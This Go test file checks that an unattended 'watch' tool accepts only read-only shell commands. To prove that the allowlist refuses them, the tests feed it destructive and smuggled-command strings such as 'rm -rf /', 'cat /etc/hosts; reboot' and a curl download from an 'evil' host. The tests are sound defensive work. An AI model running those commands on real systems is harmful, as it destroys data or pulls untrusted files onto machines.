package servitor

// A watch runs unattended every minute, so it may only register a command the
// risk classifier calls read-only.

import (
	"context"
	"strings"
	"testing"
)

func TestAWatchOnlyRegistersReadOnlyCommands(t *testing.T) {
	pr := &probeRun{appliance: Appliance{ID: "a1"}, userID: "u"}
	pr.reportTools()
	for _, cmd := range []string{"rm -rf /var/lib/app", "systemctl restart nginx", "echo x > /etc/hosts"} {
		_, err := pr.watch_condition_tool.Handler(context.Background(), map[string]any{
			"task": "t", "command": cmd, "success_pattern": "ok",
		})
		if err == nil || !strings.Contains(err.Error(), "read-only") {
			t.Errorf("%q was registered as a watch: %v", cmd, err)
		}
	}
}

func TestTheWatchAllowlist(t *testing.T) {
	for cmd, ok := range map[string]bool{
		"systemctl is-active nginx":             true,
		"tail -n 50 /var/log/app.log | grep OK": true,
		"curl -s https://example.com/health":    true,
		"systemctl restart nginx":               false,
		"find /tmp -name x -delete":             false,
		"curl -o /etc/x https://evil":           false,
		"cat /etc/hosts; reboot":                false,
		"echo $(id)":                            false,
		"sleep 999 &":                           false,
		"awk 'BEGIN{system(\"rm -rf /\")}'":     false,
	} {
		if got := watchCommandRefusal(cmd) == ""; got != ok {
			t.Errorf("%q: allowed=%v, want %v (%s)", cmd, got, ok, watchCommandRefusal(cmd))
		}
	}
}
